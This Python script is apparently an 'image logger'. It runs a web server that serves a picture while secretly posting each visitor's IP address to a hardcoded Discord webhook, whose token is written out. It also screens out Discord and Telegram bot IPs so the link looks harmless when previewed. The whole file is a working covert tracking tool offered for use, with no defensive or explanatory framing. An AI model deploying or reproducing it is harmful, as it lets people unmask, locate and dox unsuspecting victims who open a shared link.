# Discord Image Logger - Fixed Version

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser

config = {
    "webhook": "https://discord.com/api/webhooks/1486621531974139996/qmCm0qaiJSBLHAz5Iy6FcSqh0hIqV30kVK58dY1fkII1Aeh7V2z-qs9WHs2aEJLel5uR",
    "image": "https://i.pinimg.com/1200x/31/25/10/312510d433b3bdd29f6b12ffcab62557.jpg",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "Image opened",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": False,  # مهم
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "Error",
            "embeds": [{"description": f"```{error}```"}]
        })
    except:
        pass

def makeReport(ip, useragent=None, endpoint="N/A", url=None):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "",
            "embeds": [{
                "title": "Visitor",
                "description": f"IP: {ip}\nEndpoint: {endpoint}",
                "color": config["color"]
            }]
        })
    except:
        pass

class ImageLoggerAPI(BaseHTTPRequestHandler):

    def handleRequest(self):
        try:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

            url = config["image"]
            if config["imageArgument"] and (dic.get("url") or dic.get("id")):
                try:
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                except:
                    pass

            # IP fix
            ip = self.headers.get('x-forwarded-for')
            if not ip:
                ip = self.client_address[0]

            if ip.startswith(blacklistedIPs):
                return

            # Bot handling
            if botCheck(ip, self.headers.get('user-agent')):
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()

                if config["buggedImage"]:
                    self.wfile.write(b'')
                else:
                    img = requests.get(url, timeout=5).content
                    self.wfile.write(img)

                makeReport(ip, endpoint=s.split("?")[0], url=url)
                return

            # Logging (safe)
            try:
                makeReport(ip, self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)
            except:
                pass

            # IMPORTANT: return image not HTML
            try:
                img = requests.get(url, timeout=5).content

                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()

                self.wfile.write(img)

            except:
                self.send_response(500)
                self.end_headers()

        except Exception:
            self.send_response(500)
            self.end_headers()
            reportError(traceback.format_exc())

    do_GET = handleRequest
    do_POST = handleRequest


PORT = 8000
server = HTTPServer(("0.0.0.0", PORT), ImageLoggerAPI)
print(f"Server running on http://localhost:{PORT}")
server.serve_forever()
